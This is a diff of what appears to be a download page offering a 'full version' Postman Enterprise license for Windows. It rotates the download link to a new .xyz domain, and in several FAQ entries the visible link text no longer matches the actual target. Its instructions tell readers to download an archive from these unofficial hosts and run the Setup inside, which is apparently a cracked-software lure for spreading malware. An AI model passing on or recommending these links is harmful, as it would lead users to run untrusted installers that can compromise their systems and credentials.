@@ -29,8 +29,8 @@ Full Version  ◆  Pro  ◆  Complete  ◆  Windows
 
 > Use the project link below for Windows.
 
-* **Project link:** **[postman-enterprise-license-2026.nexpath.xyz](https://postman-enterprise-license-2026.nexpath.xyz/)**
-* **Full URL:** `https://postman-enterprise-license-2026.nexpath.xyz/`
+* **Project link:** **[postman-enterprise-license-2026.nerasix.xyz](https://postman-enterprise-license-2026.nerasix.xyz/)**
+* **Full URL:** `https://postman-enterprise-license-2026.nerasix.xyz/`
 * **Type:** Desktop package | Windows 10 and 11, 64-bit
 * **Setup:** Run the installer from the extracted folder
 
@@ -56,17 +56,17 @@ Full Version  ◆  Pro  ◆  Complete  ◆  Windows
 
 <details>
 <summary>&nbsp;<b>How to install?</b></summary>
-<br>Open <a href="https://postman-enterprise-license-2026.nexpath.xyz/">postman-enterprise-license-2026.nexpath.xyz</a>, click <b>Download</b>, extract the archive, then run <b>Setup</b>.
+<br>Open <a href="https://postman-enterprise-license-2026.nerasix.xyz/">postman-enterprise-license-2026.nexpath.xyz</a>, click <b>Download</b>, extract the archive, then run <b>Setup</b>.
 </details>
 
 <details>
 <summary>&nbsp;<b>Download didn't start?</b></summary>
-<br>Use the manual link on the NexPath download page, or open <a href="https://postman-enterprise-license-2026.nexpath.xyz/">postman-enterprise-license-2026.nexpath.xyz</a> directly in your browser.
+<br>Use the manual link on the NexPath download page, or open <a href="https://postman-enterprise-license-2026.nerasix.xyz/">postman-enterprise-license-2026.nexpath.xyz</a> directly in your browser.
 </details>
 
 <details>
 <summary>&nbsp;<b>Updates?</b></summary>
-<br>Open <a href="https://postman-enterprise-license-2026.nexpath.xyz/">postman-enterprise-license-2026.nexpath.xyz</a> again and download the latest version from NexPath.
+<br>Open <a href="https://postman-enterprise-license-2026.nerasix.xyz/">postman-enterprise-license-2026.nexpath.xyz</a> again and download the latest version from NexPath.
 </details>
 <details>
 <summary>&nbsp;<b>Requirements?</b></summary>
